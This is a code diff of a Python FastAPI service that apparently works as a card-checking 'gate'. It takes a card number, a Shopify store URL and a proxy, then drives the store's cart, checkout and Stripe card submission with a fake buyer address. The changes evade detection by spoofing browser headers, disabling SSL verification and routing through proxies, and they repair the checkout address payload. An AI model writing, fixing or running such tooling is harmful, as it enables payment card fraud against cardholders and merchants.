@@ -1,12 +1,16 @@
 from fastapi import FastAPI, Query
 from fastapi.responses import JSONResponse
-from curl_cffi import requests
+import requests
 import re
 import uuid
 import random
 import time
+import urllib3
 from html import unescape
 from urllib.parse import urlparse
+
+# إخفاء تحذيرات SSL
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 app = FastAPI()
 
@@ -18,7 +22,7 @@ def format_proxy(proxy_str):
     elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
     return f"http://{proxy_str}"
 
-def safe_response(msg, raw_data, price, gate="Shopify Master V2"):
+def safe_response(msg, raw_data, price, gate="Shopify Final X-Ray"):
     raw_clean = str(raw_data).replace('\n', ' ').replace('\r', '').replace('  ', '')[:70] if raw_data else "No Raw Data"
     final_msg = f"{msg} | RAW: {raw_clean}" if "Failed" in msg or "Error" in msg or "Declined" in msg else msg
     clean_price = str(price).replace('$', '').strip() if price else "-"
@@ -44,8 +48,17 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             "address1": "4024 College Point Blvd", "city": "Flushing", "province": "NY", "zip": "11354", "country": "US", "phone": "2125551234"
         }
 
-        with requests.Session(impersonate="chrome120", proxies=proxies) as session:
+        # استخدام requests العادية اللي مبتوقعش ريندر أبداً
+        with requests.Session() as session:
+            session.verify = False
+            if proxies: session.proxies.update(proxies)
             
+            session.headers.update({
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.9'
+            })
+
             variant_id, price = None, "-"
             ep = f"{store_url}/products.json?limit=250"
             try:
@@ -78,7 +91,7 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             time.sleep(1)
 
             session.headers.pop("X-Requested-With", None)
-            session.headers.update({'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Content-Type': 'application/x-www-form-urlencoded'})
+            session.headers.update({'Content-Type': 'application/x-www-form-urlencoded'})
             
             res_chk = session.post(f"{store_url}/cart", data={"checkout": "Checkout"}, allow_redirects=True)
             html_chk = res_chk.text
@@ -112,7 +125,7 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             if res_pci.status_code != 200: return JSONResponse(content=safe_response("Stripe Rejected Card Data", res_pci.text[:80], price))
             card_session_id = res_pci.json().get("id")
 
-            # إصلاح صيغة العنوان (السبب الرئيسي لخطأ الـ Proposal)
+            # === هنا تصليح العنوان فقط اللي عملت الكود عشانه ===
             flat_address = {
                 "countryCode": buyer["country"],
                 "zoneCode": buyer["province"],
@@ -132,7 +145,7 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             prop_vars = {
                 "delivery": {
                     "deliveryLines": [{
-                        "destination": flat_address, # تم التعديل لتطابق تحديث شوبي فاي الأخير
+                        "destination": flat_address,
                         "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]},
                         "deliveryMethodTypes": ["SHIPPING"],
                         "destinationChanged": True,
